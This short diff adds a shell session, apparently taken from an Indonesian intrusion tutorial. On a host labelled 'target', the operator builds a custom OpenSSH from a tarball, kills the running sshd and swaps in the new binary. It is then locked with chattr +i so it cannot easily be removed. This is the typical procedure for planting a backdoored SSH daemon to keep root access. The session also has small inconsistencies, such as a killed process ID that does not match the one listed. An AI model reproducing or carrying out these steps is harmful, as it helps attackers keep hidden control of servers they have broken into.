@@ -1,0 +1,13 @@
+openssh.tar.gz
+tar xvzf openssh.tar.gz;rm -rf openssh.tar.gz;cd ssh
+root@target]#./configure --prefix=/usr/local/sshd/ (Tunggu sampai selesai)
+[root@target]#make;make install (Tunggu sampai selesai)
+[root@target]#ps -axu|grep /sbin/sshd
+Warning: bad ps syntax, perhaps a bogus ‘-’? See http://procps.sf.net/faq.html
+root 3380 0.0 0.6 4272 1576 ? Ss 13:15 0:00 /usr/sbin/sshd
+root 4903 0.0 0.2 2032 664 pts/5 S+ 16:56 0:00 grep /sbin/sshd
+[root@target]#kill -9 4589;mv /usr/sbin/sshd .
+[root@target]#cp /usr/local/sshd/sbin/sshd /usr/sbin/sshd
+[root@target]#chmod +x /usr/sbin/sshd;kill -HUP `cat /var/run/sshd.pid`
+/usr/sbin/sshd
+chattr +i /usr/sbin/sshd
